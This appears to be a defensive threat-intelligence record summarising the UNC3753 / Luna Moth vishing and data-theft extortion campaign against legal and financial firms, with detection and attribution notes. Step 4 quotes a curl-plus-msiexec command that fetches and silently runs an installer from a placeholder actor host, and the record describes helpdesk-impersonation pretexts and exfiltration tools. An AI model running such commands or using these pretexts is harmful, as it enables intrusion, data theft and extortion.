    note: >
      Mandiant / GTIG five-named-author byline (Chad Reams, Tufail Ahmed,
      Keith Knapp, Ashley Frazer, Tyler McLellan; published 2026-06-05)
      attributes a financially-motivated data-theft-extortion campaign
      to the UNC3753 cluster with aliases Luna Moth, Chatty Spider,
      Silent Ransom Group (SRG). TTP overlap with UNC2686 ("Bazarcall"-
      style campaigns dating to early 2021). Active since at least
      March 2022; deployed LOCKBIT.BLACK in 2022; shifted from
      subscription-themed billing email lures to IT-helpdesk
      impersonation around March 2025.

      Mandiant attribution is single-IR-vendor on the UNC3753 cluster
      identity; the campaign body is the substantiation of the
      morning-brief title-snapshot finding (finding-2026-06-17-0003).
      Filed unattributed pending operator `/new-actor` decision.

notes: |
  Campaign window: January through May 2026.
  Targeting: US legal services (primary), professional services,
  financial services. Mandiant does NOT name A&D-prime victims.
  A&D-supply-chain-adjacent via outside-counsel pathway (ITAR /
  export-control / IP-litigation counsel).

  Operational template:
    1. Email lure — invoice-themed, non-malicious, from actor-
       controlled consumer email; designed to raise the target's
       internal security antennae so the follow-up vishing call
       lands credibly.
    2. Voice phishing — IT-helpdesk / security-team impersonation;
       pretexts include data-migration projects and security-issue
       remediation; goal is to direct the target into screen-sharing.
    3. Screen-sharing utilities — Zoom, Microsoft Terminal Services,
       Microsoft Teams, Quick Assist.
    4. Commercial RMM deployment — AnyDesk, Bomgar, Zoho Assist,
       SuperOps RMM. SuperOps observed deployed via cURL +
       msiexec /quiet:
         curl -sL "http://<actor-ip>/installer" -o "SuperOps.msi"
         && msiexec /i "SuperOps.msi" /quiet
    5. Delivery mechanism — Privnote (privnote[.]com) self-
       destructing text utility for installation links / commands.
    6. Infrastructure pivot — BYOD compromise (personal laptops) +
       VDI access via Windows 365 (Windows365.exe), Citrix clients.
    7. File-system pivot — local directories, active OneDrive
       folders, mapped network drives; iManage / SharePoint /
       OneDrive keyword search for tax logs (W-2/W-9/1099), audit
       files, corporate client agreements, SSNs.
    8. Staging — compile/sort within target-accessible
       subdirectories (Downloads, Roaming profile).
    9. Exfiltration — drag-and-drop into actor-controlled consumer
       file-sharing accounts (Google Drive), Portable WinSCP,
       Rclone. One observed incident: 1.7 GB to Google Drive then
       VDI pivot + 14.4 GB via WinSCP.
    10. Email-mailbox staging — instructed victims to forward iManage
        files to actor-controlled consumer emails from the target's
        own mailbox.
    11. Physical office intrusions — individuals posing as IT
        technicians attempting USB exfiltration. Mandiant: "limited
        forensic evidence and absence of subsequent extortion
        attempts prevent formal attribution; however, physical
        intrusions likely associated with UNC3753 based on
        structural, timeline, and targeting overlaps."
    12. Extortion — email contact within ~30 minutes of exit; three-
        day response window; escalation via direct calls/emails to
        employees, external client contact, LEAKEDDATA DLS publication.

  A&D defensive posture:
    - Outside-counsel exposure is real and structural; firm-side
      controls (BYOD/VDI conditional access, RMM block-list, USB
      hardening, physical visitor verification) are operator-
      applicable to A&D primes and their outside-counsel partners.
    - The tradecraft template is highly portable. Even absent
      direct A&D-prime victimization, A&D defenders running
      BYOD/VDI environments should validate that conditional
      access restricts to corporate-owned devices and that RMM
      controls block unauthorized AnyDesk / Bomgar / Zoho Assist
      / SuperOps installs.

  Splunk first-party status at finding publication (2026-06-17
  16:00 EDT afternoon brief): clean over -6h on the combined
  46-IOC standing set + this cluster's net-new IOCs across
  defenseclaw_local and archimedes (excluding self-telemetry
  sourcetypes). Hard Rule 8 — silence is NOT disconfirming.
  Frank is NOT a US legal / professional / financial services
  firm; visibility-limited absence flagged not negative-evidence.

  Migration to actor-attributed iocs.yaml:
    - Operator approves `/new-actor UNC3753` candidacy and
      actor dossier is scaffolded; cluster migrates to
      threats/threat-actors/<NNN>-unc3753/iocs.yaml.
    - Independent A-grade IR-vendor (CrowdStrike / Unit 42 /
      Volexity / MSTIC) corroborates the Luna Moth / Chatty
      Spider / SRG alias chain with second-vendor attribution
      language firmer than Mandiant's primary.
    - First-party Splunk hit on these IOCs.

